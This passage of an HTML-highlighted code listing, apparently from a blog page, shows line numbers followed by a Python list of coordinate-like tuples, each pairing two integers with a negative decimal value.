class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br><span class="line">818</span><br><span class="line">819</span><br><span class="line">820</span><br><span class="line">821</span><br><span class="line">822</span><br><span class="line">823</span><br><span class="line">824</span><br><span class="line">825</span><br><span class="line">826</span><br><span class="line">827</span><br><span class="line">828</span><br><span class="line">829</span><br><span class="line">830</span><br><span class="line">831</span><br><span class="line">832</span><br><span class="line">833</span><br><span class="line">834</span><br><span class="line">835</span><br><span class="line">836</span><br><span class="line">837</span><br><span class="line">838</span><br><span class="line">839</span><br><span class="line">840</span><br><span class="line">841</span><br><span class="line">842</span><br><span class="line">843</span><br><span class="line">844</span><br><span class="line">845</span><br><span class="line">846</span><br><span class="line">847</span><br><span class="line">848</span><br><span class="line">849</span><br><span class="line">850</span><br><span class="line">851</span><br><span class="line">852</span><br><span class="line">853</span><br><span class="line">854</span><br><span class="line">855</span><br><span class="line">856</span><br><span class="line">857</span><br><span class="line">858</span><br><span class="line">859</span><br><span class="line">860</span><br><span class="line">861</span><br><span class="line">862</span><br><span class="line">863</span><br><span class="line">864</span><br><span class="line">865</span><br><span class="line">866</span><br><span class="line">867</span><br><span class="line">868</span><br><span class="line">869</span><br><span class="line">870</span><br><span class="line">871</span><br><span class="line">872</span><br><span class="line">873</span><br><span class="line">874</span><br><span class="line">875</span><br><span class="line">876</span><br><span class="line">877</span><br><span class="line">878</span><br><span class="line">879</span><br><span class="line">880</span><br><span class="line">881</span><br><span class="line">882</span><br><span class="line">883</span><br><span class="line">884</span><br><span class="line">885</span><br><span class="line">886</span><br><span class="line">887</span><br><span class="line">888</span><br><span class="line">889</span><br><span class="line">890</span><br><span class="line">891</span><br><span class="line">892</span><br><span class="line">893</span><br><span class="line">894</span><br><span class="line">895</span><br><span class="line">896</span><br><span class="line">897</span><br><span class="line">898</span><br><span class="line">899</span><br><span class="line">900</span><br><span class="line">901</span><br><span class="line">902</span><br><span class="line">903</span><br><span class="line">904</span><br><span class="line">905</span><br><span class="line">906</span><br><span class="line">907</span><br><span class="line">908</span><br><span class="line">909</span><br><span class="line">910</span><br><span class="line">911</span><br><span class="line">912</span><br><span class="line">913</span><br><span class="line">914</span><br><span class="line">915</span><br><span class="line">916</span><br><span class="line">917</span><br><span class="line">918</span><br><span class="line">919</span><br><span class="line">920</span><br><span class="line">921</span><br><span class="line">922</span><br><span class="line">923</span><br><span class="line">924</span><br><span class="line">925</span><br><span class="line">926</span><br><span class="line">927</span><br><span class="line">928</span><br><span class="line">929</span><br><span class="line">930</span><br><span class="line">931</span><br><span class="line">932</span><br><span class="line">933</span><br><span class="line">934</span><br><span class="line">935</span><br><span class="line">936</span><br><span class="line">937</span><br><span class="line">938</span><br><span class="line">939</span><br><span class="line">940</span><br><span class="line">941</span><br><span class="line">942</span><br><span class="line">943</span><br><span class="line">944</span><br><span class="line">945</span><br><span class="line">946</span><br><span class="line">947</span><br><span class="line">948</span><br><span class="line">949</span><br><span class="line">950</span><br><span class="line">951</span><br><span class="line">952</span><br><span class="line">953</span><br><span class="line">954</span><br><span class="line">955</span><br><span class="line">956</span><br><span class="line">957</span><br><span class="line">958</span><br><span class="line">959</span><br><span class="line">960</span><br><span class="line">961</span><br><span class="line">962</span><br><span class="line">963</span><br><span class="line">964</span><br><span class="line">965</span><br><span class="line">966</span><br><span class="line">967</span><br><span class="line">968</span><br><span class="line">969</span><br><span class="line">970</span><br><span class="line">971</span><br><span class="line">972</span><br><span class="line">973</span><br><span class="line">974</span><br><span class="line">975</span><br><span class="line">976</span><br><span class="line">977</span><br><span class="line">978</span><br><span class="line">979</span><br><span class="line">980</span><br><span class="line">981</span><br><span class="line">982</span><br><span class="line">983</span><br><span class="line">984</span><br><span class="line">985</span><br><span class="line">986</span><br><span class="line">987</span><br><span class="line">988</span><br><span class="line">989</span><br><span class="line">990</span><br><span class="line">991</span><br><span class="line">992</span><br><span class="line">993</span><br><span class="line">994</span><br><span class="line">995</span><br><span class="line">996</span><br><span class="line">997</span><br><span class="line">998</span><br><span class="line">999</span><br><span class="line">1000</span><br><span class="line">1001</span><br><span class="line">1002</span><br><span class="line">1003</span><br><span class="line">1004</span><br><span class="line">1005</span><br><span class="line">1006</span><br><span class="line">1007</span><br><span class="line">1008</span><br><span class="line">1009</span><br><span class="line">1010</span><br><span class="line">1011</span><br><span class="line">1012</span><br><span class="line">1013</span><br><span class="line">1014</span><br><span class="line">1015</span><br><span class="line">1016</span><br><span class="line">1017</span><br><span class="line">1018</span><br><span class="line">1019</span><br></pre></td><td class="code"><pre><code class="hljs python">data = [(<span class="hljs-number">37</span>, <span class="hljs-number">9</span>, -<span class="hljs-number">6.5</span>),<br>(<span class="hljs-number">38</span>, <span class="hljs-number">9</span>, -<span class="hljs-number">4.1</span>),<br>(<span class="hljs-number">39</span>, <span class="hljs-number">9</span>, -<span class="hljs-number">5.9</span>),<br>(<span class="hljs-number">40</span>, <span class="hljs-number">9</span>, -<span class="hljs-number">4.6</span>),<br>(<span class="hljs-number">41</span>, <span class="hljs-number">9</span>, -<span class="hljs-number">7</span>),<br>(<span class="hljs-number">73</span>, <span class="hljs-number">9</span>, -<span class="hljs-number">5.6</span>),<br>(<span class="hljs-number">74</span>, <span class="hljs-number">9</span>, -<span class="hljs-number">4.2</span>),<br>(<span class="hljs-number">75</span>, <span class="hljs-number">9</span>, -<span class="hljs-number">6.4</span>),<br>(<span class="hljs-number">76</span>, <span class="hljs-number">9</span>, -<span class="hljs-number">5.6</span>),<br>(<span class="hljs-number">77</span>, <span class="hljs-number">9</span>, -<span class="hljs-number">4</span>),<br>(<span class="hljs-number">36</span>, <span class="hljs-number">10</span>, -<span class="hljs-number">4.3</span>),<br>(<span class="hljs-number">37</span>, <span class="hljs-number">10</span>, -<span class="hljs-number">6.4</span>),<br>(<span class="hljs-number">38</span>, <span class="hljs-number">10</span>, -<span class="hljs-number">4.7</span>),<br>(<span class="hljs-number">41</span>, <span class="hljs-number">10</span>, -<span class="hljs-number">5</span>),<br>(<span class="hljs-number">42</span>, <span class="hljs-number">10</span>, -<span class="hljs-number">3.9</span>),<br>(<span class="hljs-number">43</span>, <span class="hljs-number">10</span>, -<span class="hljs-number">3.5</span>),<br>(<span class="hljs-number">72</span>, <span class="hljs-number">10</span>, -<span class="hljs-number">6</span>),<br>(<span class="hljs-number">73</span>, <span class="hljs-number">10</span>, -<span class="hljs-number">5.8</span>),<br>(<span class="hljs-number">74</span>, <span class="hljs-number">10</span>, -<span class="hljs-number">2.5</span>),<br>(<span class="hljs-number">77</span>, <span class="hljs-number">10</span>, -<span class="hljs-number">6.4</span>),<br>(<span class="hljs-number">78</span>, <span class="hljs-number">10</span>, -<span class="hljs-number">6</span>),<br>(<span class="hljs-number">79</span>, <span class="hljs-number">10</span>, -<span class="hljs-number">5.5</span>),<br>(<span class="hljs-number">12</span>, <span class="hljs-number">11</span>, -<span class="hljs-number">6.7</span>),<br>(<span class="hljs-number">13</span>, <span class="hljs-number">11</span>, -<span class="hljs-number">5.6</span>),<br>(<span class="hljs-number">21</span>, <span class="hljs-number">11</span>, -<span class="hljs-number">3.3</span>),<br>(<span class="hljs-number">22</span>, <span class="hljs-number">11</span>, -<span class="hljs-number">4.5</span>),<br>(<span class="hljs-number">29</span>, <span class="hljs-number">11</span>, -<span class="hljs-number">6.8</span>),<br>(<span class="hljs-number">30</span>, <span class="hljs-number">11</span>, -<span class="hljs-number">5.5</span>),<br>(<span class="hljs-number">31</span>, <span class="hljs-number">11</span>, -<span class="hljs-number">5.1</span>),<br>(<span class="hljs-number">32</span>, <span class="hljs-number">11</span>, -<span class="hljs-number">4.8</span>),<br>(<span class="hljs-number">33</span>, <span class="hljs-number">11</span>, -<span class="hljs-number">7</span>),<br>(<span class="hljs-number">34</span>, <span class="hljs-number">11</span>, -<span class="hljs-number">6.5</span>),<br>(<span class="hljs-number">37</span>, <span class="hljs-number">11</span>, -<span class="hljs-number">5.6</span>),<br>(<span class="hljs-number">38</span>, <span class="hljs-number">11</span>, -<span class="hljs-number">4.9</span>),<br>(<span class="hljs-number">41</span>, <span class="hljs-number">11</span>, -<span class="hljs-number">3.9</span>),<br>(<span class="hljs-number">42</span>, <span class="hljs-number">11</span>, -<span class="hljs-number">6.9</span>),<br>(<span class="hljs-number">43</span>, <span class="hljs-number">11</span>, -<span class="hljs-number">4.5</span>),<br>(<span class="hljs-number">48</span>, <span class="hljs-number">11</span>, -<span class="hljs-number">6.3</span>),<br>(<span class="hljs-number">49</span>, <span class="hljs-number">11</span>, -<span class="hljs-number">3</span>),<br>(<span class="hljs-number">56</span>, <span class="hljs-number">11</span>, -<span class="hljs-number">2.4</span>),<br>(<span class="hljs-number">57</span>, <span class="hljs-number">11</span>, -<span class="hljs-number">5</span>),<br>(<span class="hljs-number">58</span>, <span class="hljs-number">11</span>, -<span class="hljs-number">4.4</span>),<br>(<span class="hljs-number">59</span>, <span class="hljs-number">11</span>, -<span class="hljs-number">2.4</span>),<br>(<span class="hljs-number">60</span>, <span class="hljs-number">11</span>, -<span class="hljs-number">5</span>),<br>(<span class="hljs-number">61</span>, <span class="hljs-number">11</span>, -<span class="hljs-number">4.6</span>),<br>(<span class="hljs-number">65</span>, <span class="hljs-number">11</span>, -<span class="hljs-number">3.5</span>),<br>(<span class="hljs-number">66</span>, <span class="hljs-number">11</span>, -<span class="hljs-number">2.7</span>),<br>(<span class="hljs-number">67</span>, <span class="hljs-number">11</span>, -<span class="hljs-number">5.9</span>),<br>(<span class="hljs-number">68</span>, <span class="hljs-number">11</span>, -<span class="hljs-number">5</span>),<br>(<span class="hljs-number">73</span>, <span class="hljs-number">11</span>, -<span class="hljs-number">2.1</span>),<br>(<span class="hljs-number">74</span>, <span class="hljs-number">11</span>, -<span class="hljs-number">6.4</span>),<br>(<span class="hljs-number">77</span>, <span class="hljs-number">11</span>, -<span class="hljs-number">3.3</span>),<br>(<span class="hljs-number">78</span>, <span class="hljs-number">11</span>, -<span class="hljs-number">5.7</span>),<br>(<span class="hljs-number">79</span>, <span class="hljs-number">11</span>, -<span class="hljs-number">5.1</span>),<br>(<span class="hljs-number">83</span>, <span class="hljs-number">11</span>, -<span class="hljs-number">3.2</span>),<br>(<span class="hljs-number">84</span>, <span class="hljs-number">11</span>, -<span class="hljs-number">3.6</span>),<br>(<span class="hljs-number">85</span>, <span class="hljs-number">11</span>, -<span class="hljs-number">4.5</span>),<br>(<span class="hljs-number">86</span>, <span class="hljs-number">11</span>, -<span class="hljs-number">6.4</span>),<br>(<span class="hljs-number">92</span>, <span class="hljs-number">11</span>, -<span class="hljs-number">4.3</span>),<br>(<span class="hljs-number">93</span>, <span class="hljs-number">11</span>, -<span class="hljs-number">5.9</span>),<br>(<span class="hljs-number">94</span>, <span class="hljs-number">11</span>, -<span class="hljs-number">5.8</span>),<br>(<span class="hljs-number">95</span>, <span class="hljs-number">11</span>, -<span class="hljs-number">6.1</span>),<br>(<span class="hljs-number">96</span>, <span class="hljs-number">11</span>, -<span class="hljs-number">2.7</span>),<br>(<span class="hljs-number">97</span>, <span class="hljs-number">11</span>, -<span class="hljs-number">5.3</span>),<br>(<span class="hljs-number">12</span>, <span class="hljs-number">12</span>, -<span class="hljs-number">5.8</span>),<br>(<span class="hljs-number">13</span>, <span class="hljs-number">12</span>, -<span class="hljs-number">4.3</span>),<br>(<span class="hljs-number">22</span>, <span class="hljs-number">12</span>, -<span class="hljs-number">5.2</span>),<br>(<span class="hljs-number">23</span>, <span class="hljs-number">12</span>, -<span class="hljs-number">4</span>),<br>(<span class="hljs-number">28</span>, <span class="hljs-number">12</span>, -<span class="hljs-number">4.8</span>),<br>(<span class="hljs-number">29</span>, <span class="hljs-number">12</span>, -<span class="hljs-number">4.9</span>),<br>(<span class="hljs-number">30</span>, <span class="hljs-number">12</span>, -<span class="hljs-number">4.3</span>),<br>(<span class="hljs-number">32</span>, <span class="hljs-number">12</span>, -<span class="hljs-number">4.4</span>),<br>(<span class="hljs-number">33</span>, <span class="hljs-number">12</span>, -<span class="hljs-number">4</span>),<br>(<span class="hljs-number">34</span>, <span class="hljs-number">12</span>, -<span class="hljs-number">2.2</span>),<br>(<span class="hljs-number">38</span>, <span class="hljs-number">12</span>, -<span class="hljs-number">6.7</span>),<br>(<span class="hljs-number">39</span>, <span class="hljs-number">12</span>, -<span class="hljs-number">7</span>),<br>(<span class="hljs-number">40</span>, <span class="hljs-number">12</span>, -<span class="hljs-number">5.8</span>),<br>(<span class="hljs-number">41</span>, <span class="hljs-number">12</span>, -<span class="hljs-number">2.9</span>),<br>(<span class="hljs-number">42</span>, <span class="hljs-number">12</span>, -<span class="hljs-number">2.9</span>),<br>(<span class="hljs-number">48</span>, <span class="hljs-number">12</span>, -<span class="hljs-number">5.7</span>),<br>(<span class="hljs-number">49</span>, <span class="hljs-number">12</span>, -<span class="hljs-number">5.3</span>),<br>(<span class="hljs-number">50</span>, <span class="hljs-number">12</span>, -<span class="hljs-number">3.9</span>),<br>(<span class="hljs-number">56</span>, <span class="hljs-number">12</span>, -<span class="hljs-number">5.2</span>),<br>(<span class="hljs-number">57</span>, <span class="hljs-number">12</span>, -<span class="hljs-number">6</span>),<br>(<span class="hljs-number">59</span>, <span class="hljs-number">12</span>, -<span class="hljs-number">2.6</span>),<br>(<span class="hljs-number">60</span>, <span class="hljs-number">12</span>, -<span class="hljs-number">3.9</span>),<br>(<span class="hljs-number">61</span>, <span class="hljs-number">12</span>, -<span class="hljs-number">5.5</span>),<br>(<span class="hljs-number">65</span>, <span class="hljs-number">12</span>, -<span class="hljs-number">6.5</span>),<br>(<span class="hljs-number">66</span>, <span class="hljs-number">12</span>, -<span class="hljs-number">4.7</span>),<br>(<span class="hljs-number">68</span>, <span class="hljs-number">12</span>, -<span class="hljs-number">5.2</span>),<br>(<span class="hljs-number">69</span>, <span class="hljs-number">12</span>, -<span class="hljs-number">3.4</span>),<br>(<span class="hljs-number">70</span>, <span class="hljs-number">12</span>, -<span class="hljs-number">2.6</span>),<br>(<span class="hljs-number">74</span>, <span class="hljs-number">12</span>, -<span class="hljs-number">3.3</span>),<br>(<span class="hljs-number">75</span>, <span class="hljs-number">12</span>, -<span class="hljs-number">3.3</span>),<br>(<span class="hljs-number">76</span>, <span class="hljs-number">12</span>, -<span class="hljs-number">5.9</span>),<br>(<span class="hljs-number">77</span>, <span class="hljs-number">12</span>, -<span class="hljs-number">6.4</span>),<br>(<span class="hljs-number">78</span>, <span class="hljs-number">12</span>, -<span class="hljs-number">6.1</span>),<br>(<span class="hljs-number">83</span>, <span class="hljs-number">12</span>, -<span class="hljs-number">5.2</span>),<br>(<span class="hljs-number">84</span>, <span class="hljs-number">12</span>, -<span class="hljs-number">4.3</span>),<br>(<span class="hljs-number">86</span>, <span class="hljs-number">12</span>, -<span class="hljs-number">4.1</span>),<br>(<span class="hljs-number">87</span>, <span class="hljs-number">12</span>, -<span class="hljs-number">2.2</span>),<br>(<span class="hljs-number">88</span>, <span class="hljs-number">12</span>, -<span class="hljs-number">5.1</span>),<br>(<span class="hljs-number">92</span>, <span class="hljs-number">12</span>, -<span class="hljs-number">3.3</span>),<br>(<span class="hljs-number">93</span>, <span class="hljs-number">12</span>, -<span class="hljs-number">6.2</span>),<br>(<span class="hljs-number">95</span>, <span class="hljs-number">12</span>, -<span class="hljs-number">7</span>),<br>(<span class="hljs-number">96</span>, <span class="hljs-number">12</span>, -<span class="hljs-number">3.1</span>),<br>(<span class="hljs-number">97</span>, <span class="hljs-number">12</span>, -<span class="hljs-number">5</span>),<br>(<span class="hljs-number">12</span>, <span class="hljs-number">13</span>, -<span class="hljs-number">6.8</span>),<br>(<span class="hljs-number">13</span>, <span class="hljs-number">13</span>, -<span class="hljs-number">5.5</span>),<br>(<span class="hljs-number">14</span>, <span class="hljs-number">13</span>, -<span class="hljs-number">4.9</span>),<br>(<span class="hljs-number">22</span>, <span class="hljs-number">13</span>, -<span class="hljs-number">5.5</span>),<br>(<span class="hljs-number">23</span>, <span class="hljs-number">13</span>, -<span class="hljs-number">6.6</span>),<br>(<span class="hljs-number">29</span>, <span class="hljs-number">13</span>, -<span class="hljs-number">3</span>),<br>(<span class="hljs-number">30</span>, <span class="hljs-number">13</span>, -<span class="hljs-number">3.5</span>),<br>(<span class="hljs-number">33</span>, <span class="hljs-number">13</span>, -<span class="hljs-number">2.8</span>),<br>(<span class="hljs-number">34</span>, <span class="hljs-number">13</span>, -<span class="hljs-number">2.5</span>),<br>(<span class="hljs-number">38</span>, <span class="hljs-number">13</span>, -<span class="hljs-number">6.9</span>),<br>(<span class="hljs-number">39</span>, <span class="hljs-number">13</span>, -<span class="hljs-number">2.5</span>),<br>(<span class="hljs-number">40</span>, <span class="hljs-number">13</span>, -<span class="hljs-number">4.2</span>),<br>(<span class="hljs-number">41</span>, <span class="hljs-number">13</span>, -<span class="hljs-number">3.8</span>),<br>(<span class="hljs-number">55</span>, <span class="hljs-number">13</span>, -<span class="hljs-number">5.2</span>),<br>(<span class="hljs-number">56</span>, <span class="hljs-number">13</span>, -<span class="hljs-number">4.4</span>),<br>(<span class="hljs-number">57</span>, <span class="hljs-number">13</span>, -<span class="hljs-number">2.9</span>),<br>(<span class="hljs-number">60</span>, <span class="hljs-number">13</span>, -<span class="hljs-number">3.2</span>),<br>(<span class="hljs-number">61</span>, <span class="hljs-number">13</span>, -<span class="hljs-number">4.1</span>),<br>(<span class="hljs-number">65</span>, <span class="hljs-number">13</span>, -<span class="hljs-number">5.1</span>),<br>(<span class="hljs-number">66</span>, <span class="hljs-number">13</span>, -<span class="hljs-number">5.6</span>),<br>(<span class="hljs-number">69</span>, <span class="hljs-number">13</span>, -<span class="hljs-number">3</span>),<br>(<span class="hljs-number">70</span>, <span class="hljs-number">13</span>, -<span class="hljs-number">6.8</span>),<br>(<span class="hljs-number">71</span>, <span class="hljs-number">13</span>, -<span class="hljs-number">4.4</span>),<br>(<span class="hljs-number">74</span>, <span class="hljs-number">13</span>, -<span class="hljs-number">4.4</span>),<br>(<span class="hljs-number">75</span>, <span class="hljs-number">13</span>, -<span class="hljs-number">6.4</span>),<br>(<span class="hljs-number">76</span>, <span class="hljs-number">13</span>, -<span class="hljs-number">3.6</span>),<br>(<span class="hljs-number">77</span>, <span class="hljs-number">13</span>, -<span class="hljs-number">3</span>),<br>(<span class="hljs-number">83</span>, <span class="hljs-number">13</span>, -<span class="hljs-number">2.4</span>),<br>(<span class="hljs-number">84</span>, <span class="hljs-number">13</span>, -<span class="hljs-number">4.9</span>),<br>(<span class="hljs-number">87</span>, <span class="hljs-number">13</span>, -<span class="hljs-number">5</span>),<br>(<span class="hljs-number">88</span>, <span class="hljs-number">13</span>, -<span class="hljs-number">4.9</span>),<br>(<span class="hljs-number">89</span>, <span class="hljs-number">13</span>, -<span class="hljs-number">5.6</span>),<br>(<span class="hljs-number">91</span>, <span class="hljs-number">13</span>, -<span class="hljs-number">6.6</span>),<br>(<span class="hljs-number">92</span>, <span class="hljs-number">13</span>, -<span class="hljs-number">5.1</span>),<br>(<span class="hljs-number">93</span>, <span class="hljs-number">13</span>, -<span class="hljs-number">2.1</span>),<br>(<span class="hljs-number">96</span>, <span class="hljs-number">13</span>, -<span class="hljs-number">3.3</span>),<br>(<span class="hljs-number">97</span>, <span class="hljs-number">13</span>, -<span class="hljs-number">6</span>),<br>(<span class="hljs-number">13</span>, <span class="hljs-number">14</span>, -<span class="hljs-number">4.1</span>),<br>(<span class="hljs-number">14</span>, <span class="hljs-number">14</span>, -<span class="hljs-number">6.1</span>),<br>(<span class="hljs-number">22</span>, <span class="hljs-number">14</span>, -<span class="hljs-number">3.1</span>),<br>(<span class="hljs-number">23</span>, <span class="hljs-number">14</span>, -<span class="hljs-number">2.4</span>),<br>(<span class="hljs-number">30</span>, <span class="hljs-number">14</span>, -<span class="hljs-number">6</span>),<br>(<span class="hljs-number">31</span>, <span class="hljs-number">14</span>, -<span class="hljs-number">4.6</span>),<br>(<span class="hljs-number">32</span>, <span class="hljs-number">14</span>, -<span class="hljs-number">6.7</span>),<br>(<span class="hljs-number">33</span>, <span class="hljs-number">14</span>, -<span class="hljs-number">3.5</span>),<br>(<span class="hljs-number">34</span>, <span class="hljs-number">14</span>, -<span class="hljs-number">4.7</span>),<br>(<span class="hljs-number">39</span>, <span class="hljs-number">14</span>, -<span class="hljs-number">5.1</span>),<br>(<span class="hljs-number">40</span>, <span class="hljs-number">14</span>, -<span class="hljs-number">5.3</span>),<br>(<span class="hljs-number">41</span>, <span class="hljs-number">14</span>, -<span class="hljs-number">5.3</span>),<br>(<span class="hljs-number">42</span>, <span class="hljs-number">14</span>, -<span class="hljs-number">4.8</span>),<br>(<span class="hljs-number">43</span>, <span class="hljs-number">14</span>, -<span class="hljs-number">4.8</span>),<br>(<span class="hljs-number">56</span>, <span class="hljs-number">14</span>, -<span class="hljs-number">6.5</span>),<br>(<span class="hljs-number">57</span>, <span class="hljs-number">14</span>, -<span class="hljs-number">6.3</span>),<br>(<span class="hljs-number">60</span>, <span class="hljs-number">14</span>, -<span class="hljs-number">4.2</span>),<br>(<span class="hljs-number">61</span>, <span class="hljs-number">14</span>, -<span class="hljs-number">4.8</span>),<br>(<span class="hljs-number">62</span>, <span class="hljs-number">14</span>, -<span class="hljs-number">4.3</span>),<br>(<span class="hljs-number">65</span>, <span class="hljs-number">14</span>, -<span class="hljs-number">4.1</span>),<br>(<span class="hljs-number">66</span>, <span class="hljs-number">14</span>, -<span class="hljs-number">6</span>),<br>(<span class="hljs-number">70</span>, <span class="hljs-number">14</span>, -<span class="hljs-number">2.4</span>),<br>(<span class="hljs-number">71</span>, <span class="hljs-number">14</span>, -<span class="hljs-number">4.3</span>),<br>(<span class="hljs-number">75</span>, <span class="hljs-number">14</span>, -<span class="hljs-number">4.5</span>),<br>(<span class="hljs-number">76</span>, <span class="hljs-number">14</span>, -<span class="hljs-number">5.3</span>),<br>(<span class="hljs-number">77</span>, <span class="hljs-number">14</span>, -<span class="hljs-number">6.9</span>),<br>(<span class="hljs-number">78</span>, <span class="hljs-number">14</span>, -<span class="hljs-number">4.1</span>),<br>(<span class="hljs-number">79</span>, <span class="hljs-number">14</span>, -<span class="hljs-number">4.4</span>),<br>(<span class="hljs-number">83</span>, <span class="hljs-number">14</span>, -<span class="hljs-number">4.3</span>),<br>(<span class="hljs-number">84</span>, <span class="hljs-number">14</span>, -<span class="hljs-number">6.6</span>),<br>(<span class="hljs-number">88</span>, <span class="hljs-number">14</span>, -<span class="hljs-number">6.1</span>),<br>(<span class="hljs-number">89</span>, <span class="hljs-number">14</span>, -<span class="hljs-number">4.3</span>),<br>(<span class="hljs-number">92</span>, <span class="hljs-number">14</span>, -<span class="hljs-number">4.1</span>),<br>(<span class="hljs-number">93</span>, <span class="hljs-number">14</span>, -<span class="hljs-number">4.1</span>),<br>(<span class="hljs-number">96</span>, <span class="hljs-number">14</span>, -<span class="hljs-number">3.1</span>),<br>(<span class="hljs-number">97</span>, <span class="hljs-number">14</span>, -<span class="hljs-number">5.4</span>),<br>(<span class="hljs-number">98</span>, <span class="hljs-number">14</span>, -<span class="hljs-number">3</span>),<br>(<span class="hljs-number">13</span>, <span class="hljs-number">15</span>, -<span class="hljs-number">4.2</span>),<br>(<span class="hljs-number">14</span>, <span class="hljs-number">15</span>, -<span class="hljs-number">2.8</span>),<br>(<span class="hljs-number">23</span>, <span class="hljs-number">15</span>, -<span class="hljs-number">5.5</span>),<br>(<span class="hljs-number">24</span>, <span class="hljs-number">15</span>, -<span class="hljs-number">2.7</span>),<br>(<span class="hljs-number">33</span>, <span class="hljs-number">15</span>, -<span class="hljs-number">5.9</span>),<br>(<span class="hljs-number">34</span>, <span class="hljs-number">15</span>, -<span class="hljs-number">4.3</span>),<br>(<span class="hljs-number">35</span>, <span class="hljs-number">15</span>, -<span class="hljs-number">3.3</span>),<br>(<span class="hljs-number">39</span>, <span class="hljs-number">15</span>, -<span class="hljs-number">4.8</span>),<br>(<span class="hljs-number">40</span>, <span class="hljs-number">15</span>, -<span class="hljs-number">4.5</span>),<br>(<span class="hljs-number">42</span>, <span class="hljs-number">15</span>, -<span class="hljs-number">2.5</span>),<br>(<span class="hljs-number">43</span>, <span class="hljs-number">15</span>, -<span class="hljs-number">3</span>),<br>(<span class="hljs-number">56</span>, <span class="hljs-number">15</span>, -<span class="hljs-number">4.5</span>),<br>(<span class="hljs-number">57</span>, <span class="hljs-number">15</span>, -<span class="hljs-number">5.5</span>),<br>(<span class="hljs-number">61</span>, <span class="hljs-number">15</span>, -<span class="hljs-number">2.9</span>),<br>(<span class="hljs-number">62</span>, <span class="hljs-number">15</span>, -<span class="hljs-number">6.8</span>),<br>(<span class="hljs-number">65</span>, <span class="hljs-number">15</span>, -<span class="hljs-number">2.4</span>),<br>(<span class="hljs-number">66</span>, <span class="hljs-number">15</span>, -<span class="hljs-number">3.1</span>),<br>(<span class="hljs-number">70</span>, <span class="hljs-number">15</span>, -<span class="hljs-number">4.1</span>),<br>(<span class="hljs-number">71</span>, <span class="hljs-number">15</span>, -<span class="hljs-number">2.5</span>),<br>(<span class="hljs-number">75</span>, <span class="hljs-number">15</span>, -<span class="hljs-number">4.8</span>),<br>(<span class="hljs-number">76</span>, <span class="hljs-number">15</span>, -<span class="hljs-number">7</span>),<br>(<span class="hljs-number">78</span>, <span class="hljs-number">15</span>, -<span class="hljs-number">6.2</span>),<br>(<span class="hljs-number">79</span>, <span class="hljs-number">15</span>, -<span class="hljs-number">4.2</span>),<br>(<span class="hljs-number">83</span>, <span class="hljs-number">15</span>, -<span class="hljs-number">2.5</span>),<br>(<span class="hljs-number">84</span>, <span class="hljs-number">15</span>, -<span class="hljs-number">4.4</span>),<br>(<span class="hljs-number">88</span>, <span class="hljs-number">15</span>, -<span class="hljs-number">3.3</span>),<br>(<span class="hljs-number">89</span>, <span class="hljs-number">15</span>, -<span class="hljs-number">4.2</span>),<br>(<span class="hljs-number">92</span>, <span class="hljs-number">15</span>, -<span class="hljs-number">4.8</span>),<br>(<span class="hljs-number">93</span>, <span class="hljs-number">15</span>, -<span class="hljs-number">2.5</span>),<br>(<span class="hljs-number">97</span>, <span class="hljs-number">15</span>, -<span class="hljs-number">2.8</span>),<br>(<span class="hljs-number">98</span>, <span class="hljs-number">15</span>, -<span class="hljs-number">3.1</span>),<br>(<span class="hljs-number">14</span>, <span class="hljs-number">16</span>, -<span class="hljs-number">4.4</span>),<br>(<span class="hljs-number">15</span>, <span class="hljs-number">16</span>, -<span class="hljs-number">6.3</span>),<br>(<span class="hljs-number">23</span>, <span class="hljs-number">16</span>, -<span class="hljs-number">2.9</span>),<br>(<span class="hljs-number">24</span>, <span class="hljs-number">16</span>, -<span class="hljs-number">4.8</span>),<br>(<span class="hljs-number">30</span>, <span class="hljs-number">16</span>, -<span class="hljs-number">5.1</span>),<br>(<span class="hljs-number">31</span>, <span class="hljs-number">16</span>, -<span class="hljs-number">4.7</span>),<br>(<span class="hljs-number">34</span>, <span class="hljs-number">16</span>, -<span class="hljs-number">5</span>),<br>(<span class="hljs-number">35</span>, <span class="hljs-number">16</span>, -<span class="hljs-number">4.8</span>),<br>(<span class="hljs-number">39</span>, <span class="hljs-number">16</span>, -<span class="hljs-number">4.9</span>),<br>(<span class="hljs-number">40</span>, <span class="hljs-number">16</span>, -<span class="hljs-number">4.5</span>),<br>(<span class="hljs-number">42</span>, <span class="hljs-number">16</span>, -<span class="hljs-number">2.8</span>),<br>(<span class="hljs-number">43</span>, <span class="hljs-number">16</span>, -<span class="hljs-number">6.4</span>),<br>(<span class="hljs-number">44</span>, <span class="hljs-number">16</span>, -<span class="hljs-number">3.7</span>),<br>(<span class="hljs-number">57</span>, <span class="hljs-number">16</span>, -<span class="hljs-number">5.9</span>),<br>(<span class="hljs-number">58</span>, <span class="hljs-number">16</span>, -<span class="hljs-number">3.4</span>),<br>(<span class="hljs-number">61</span>, <span class="hljs-number">16</span>, -<span class="hljs-number">6.2</span>),<br>(<span class="hljs-number">62</span>, <span class="hljs-number">16</span>, -<span class="hljs-number">2.3</span>),<br>(<span class="hljs-number">66</span>, <span class="hljs-number">16</span>, -<span class="hljs-number">2.4</span>),<br>(<span class="hljs-number">67</span>, <span class="hljs-number">16</span>, -<span class="hljs-number">5.8</span>),<br>(<span class="hljs-number">70</span>, <span class="hljs-number">16</span>, -<span class="hljs-number">4.4</span>),<br>(<span class="hljs-number">71</span>, <span class="hljs-number">16</span>, -<span class="hljs-number">3.5</span>),<br>(<span class="hljs-number">75</span>, <span class="hljs-number">16</span>, -<span class="hljs-number">6.5</span>),<br>(<span class="hljs-number">76</span>, <span class="hljs-number">16</span>, -<span class="hljs-number">5.6</span>),<br>(<span class="hljs-number">78</span>, <span class="hljs-number">16</span>, -<span class="hljs-number">5.7</span>),<br>(<span class="hljs-number">79</span>, <span class="hljs-number">16</span>, -<span class="hljs-number">3.7</span>),<br>(<span class="hljs-number">80</span>, <span class="hljs-number">16</span>, -<span class="hljs-number">6.2</span>),<br>(<span class="hljs-number">84</span>, <span class="hljs-number">16</span>, -<span class="hljs-number">3.9</span>),<br>(<span class="hljs-number">85</span>, <span class="hljs-number">16</span>, -<span class="hljs-number">6.4</span>),<br>(<span class="hljs-number">88</span>, <span class="hljs-number">16</span>, -<span class="hljs-number">4.6</span>),<br>(<span class="hljs-number">89</span>, <span class="hljs-number">16</span>, -<span class="hljs-number">6</span>),<br>(<span class="hljs-number">93</span>, <span class="hljs-number">16</span>, -<span class="hljs-number">3</span>),<br>(<span class="hljs-number">94</span>, <span class="hljs-number">16</span>, -<span class="hljs-number">2.1</span>),<br>(<span class="hljs-number">97</span>, <span class="hljs-number">16</span>, -<span 